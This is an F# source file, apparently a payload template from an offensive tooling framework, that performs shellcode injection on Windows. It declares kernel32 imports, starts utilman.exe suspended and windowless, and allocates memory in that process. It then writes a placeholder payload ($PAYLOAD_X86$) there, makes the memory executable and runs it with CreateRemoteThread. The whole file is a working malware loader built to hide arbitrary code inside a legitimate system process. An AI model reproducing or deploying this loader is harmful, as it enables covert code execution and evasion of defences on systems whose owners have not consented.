open System
open System.Runtime.InteropServices
open System.Diagnostics

[<DllImport "kernel32" >]
extern nativeint VirtualAllocEx(
  nativeint     hProcess,
  nativeint         lpStartAddress,
  uint32            dwSize, 
  uint32            flAllocationType, 
  uint32          flProtect)

[<DllImport "kernel32" >]
extern nativeint CreateRemoteThread(
  nativeint      hProcess,
  int            lpThreadAttributes,
  uint32         dwStackSize, 
  nativeint      lpStartAddress, 
  nativeint      lpParam,
  uint32         dwCreationFlags,
  nativeint      lpThreadId)

[<DllImport "kernel32" >]
extern bool WriteProcessMemory(
  nativeint hProcess,
  nativeint lpBaseAddress,
  byte[] lpBuffer,
  uint32 nSize,
  nativeint& lpNumberOfBytesWritten)

[<Struct>]
[<StructLayout(LayoutKind.Sequential)>]
type STARTUPINFO = 
  val mutable cb: uint32
  val mutable lpReserved: string
  val mutable lpDesktop : string 
  val mutable lpTitle : string
  val mutable dwX : uint32
  val mutable dwY : uint32
  val mutable dwXSize : uint32
  val mutable dwYSize : uint32
  val mutable dwXCountChars : uint32
  val mutable dwYCountChars : uint32
  val mutable dwFillAttribute : uint32
  val mutable dwFlags : uint32
  val mutable wShowWindow : int16
  val mutable cbReserved2 : int16
  val mutable lpReserved2 : nativeint 
  val mutable hStdInput : nativeint 
  val mutable hStdOutput : nativeint 
  val mutable hStdError : nativeint  

[<Struct>]
[<StructLayout(LayoutKind.Sequential)>]
type P_INFORMATION = 
  val mutable hProcess : nativeint
  val mutable hThread : nativeint
  val mutable dwProcessId : uint32
  val mutable dwThreadId : uint32

[< DllImport "kernel32" >]
extern bool CreateProcess(
  string lpApplicationName,
  string lpCommandLine,
  nativeint lpProcessAttributes,
  nativeint lpThreadAttributes,
  bool bInheritHandles,
  uint32 dwCreationFlags,
  nativeint lpEnvironment,
  string lpCurrentDirectory,
  STARTUPINFO& lpStartupInfo,
  P_INFORMATION& lpProcessInformation)

[<Flags>]
type ProcessCreationFlags = 
  | ZERO_FLAG = 0x00000000u
  | CREATE_BREAKAWAY_FROM_JOB = 0x01000000u
  | CREATE_DEFAULT_ERROR_MODE = 0x04000000u
  | CREATE_NEW_CONSOLE = 0x00000010u
  | CREATE_NEW_PROCESS_GROUP = 0x00000200u
  | CREATE_NO_WINDOW = 0x08000000u
  | CREATE_PROTECTED_PROCESS = 0x00040000u
  | CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000u
  | CREATE_SEPARATE_WOW_VDM = 0x00001000u
  | CREATE_SHARED_WOW_VDM = 0x00001000u
  | CREATE_SUSPENDED = 0x00000004u
  | CREATE_UNICODE_ENVIRONMENT = 0x00000400u
  | DEBUG_ONLY_THIS_PROCESS = 0x00000002u
  | DEBUG_PROCESS = 0x00000001u
  | DETACHED_PROCESS = 0x00000008u
  | EXTENDED_STARTUPINFO_PRESENT = 0x00080000u
  | INHERIT_PARENT_AFFINITY = 0x00010000u

[<Flags>]
type PagePermissionFlags =
  | MEM_COMMIT = 0x1000u
  | PAGE_EXECUTE_READ = 0x20u
  | PAGE_READWRITE = 0x04u

[< DllImport "kernel32" >]
extern bool VirtualProtectEx(nativeint hProcess, nativeint lpAddress,
           uint32 dwSize, uint32 flNewProtect, uint32& lpflOldProtect);


let mutable sInfo =  new STARTUPINFO();;
let mutable pInfo =  new P_INFORMATION();;
let mutable ans : bool = CreateProcess(@"C:\Windows\SysWOW64\utilman.exe", null, (nativeint)0, (nativeint)0, false, (uint32)(ProcessCreationFlags.CREATE_SUSPENDED + ProcessCreationFlags.CREATE_NO_WINDOW), (nativeint)0, null,  &sInfo, &pInfo);

let mutable sc : byte[] = [|$PAYLOAD_X86$|]

let mutable outSize = new nativeint()
let address = VirtualAllocEx(pInfo.hProcess, (nativeint)0, (uint32)sc.Length, (uint32)0x1000, (uint32)0x04)
let mutable jj : bool = WriteProcessMemory(pInfo.hProcess, address, sc, (uint32)sc.Length,  &outSize)
let mutable outZero : uint32 = Unchecked.defaultof<uint32>
jj = VirtualProtectEx(pInfo.hProcess, address, (uint32)sc.Length, (uint32)0x20, &outZero)
let hThread = CreateRemoteThread(pInfo.hProcess, 0,(uint32)0, address, (nativeint)0, (uint32)0, (nativeint)0)